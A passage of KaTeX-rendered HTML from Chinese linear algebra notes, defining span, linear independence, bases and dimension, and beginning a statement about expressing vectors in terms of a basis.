</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">：</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">}</span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">为</span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">张</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">间</span></span></span></span></span></p>
<p><strong>线性无关 (linearly independence)</strong></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>称一个向量集合</mtext><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>v</mi><mi>k</mi></msub><mo>∈</mo><mi>V</mi><mtext>线性无关，当且仅当方程</mtext><mspace linebreak="newline"></mspace><msub><mi>a</mi><mn>1</mn></msub><msub><mi>v</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>v</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mi>k</mi></msub><msub><mi>v</mi><mi>k</mi></msub><mo>=</mo><mn>0</mn><mtext>的唯一解是</mtext><msub><mi>a</mi><mn>1</mn></msub><mo>=</mo><msub><mi>a</mi><mn>2</mn></msub><mo>=</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>=</mo><msub><mi>a</mi><mi>k</mi></msub><mo>=</mo><mn>0.</mn><mtext>否则这个向量集合线性相关</mtext></mrow><annotation encoding="application/x-tex">称一个向量集合v_1,...v_k \in V线性无关，当且仅当方程\\a_1v_1+a_2v_2+...+a_kv_k=0的唯一解是a_1=a_2=...=a_k=0.否则这个向量集合线性相关
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">集</span><span class="mord cjk_fallback">合</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">无</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">当</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">仅</span><span class="mord cjk_fallback">当</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">程</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord">0</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">唯</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">是</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord cjk_fallback">否</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">集</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">关</span></span></span></span></span></p>
<p><strong>基 (bases)</strong></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>向量空间</mtext><mi>V</mi><mtext>的一个基，是可以张成</mtext><mi>V</mi><mtext>的线性无关向量集合</mtext><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>v</mi><mi>n</mi></msub><mi mathvariant="normal">.</mi><mspace linebreak="newline"></mspace><mtext>也就是说，任何一个向量都可以写成</mtext><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>v</mi><mi>n</mi></msub><mtext>的线性组合的形式，其线性组合的系数是唯一的。</mtext></mrow><annotation encoding="application/x-tex">向量空间V 的一个基，是可以张成V 的线性无关向量集合v_1,...v_n
. \\也就是说，任何一个向量 都可以写成v_1,...v_n
的线性组合的形式，其线性组合的系数是唯一的。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">间</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">基</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">张</span><span class="mord cjk_fallback">成</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">无</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">集</span><span class="mord cjk_fallback">合</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">说</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">任</span><span class="mord cjk_fallback">何</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">成</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">唯</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<ol>
<li>
<p>任何一个线性空间 V 都有基。</p>
</li>
<li>
<p>任何两个基，含有的向量个数是相同的。基的向量个数称为 V 的<strong>维度 (dimension).</strong></p>
</li>
<li>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>设</mtext><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>v</mi><mi>n</mi></msub><mtext>是</mtext><mi>V</mi><mtext>的一个基，是</mtext><msub><mi>w</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>w</mi><mi>n</mi></msub><mtext>中的一个向量组。我们把</mtext><msub><mi>w</mi><mi>j</mi></msub><mtext>写成</mtext><msub><mi>v</mi><mi>i</mi></msub><mtext>的线性组合的形式：</mtext></mrow><annotation encoding="application/x-tex">设  v_1,...v_n是  V的一个基， 是 w_1,...w_n 中的一个向量组。我们把 w_j 写成 v_i 的线性组合的形式：
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord cjk_fallback">设</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">是</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">基</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 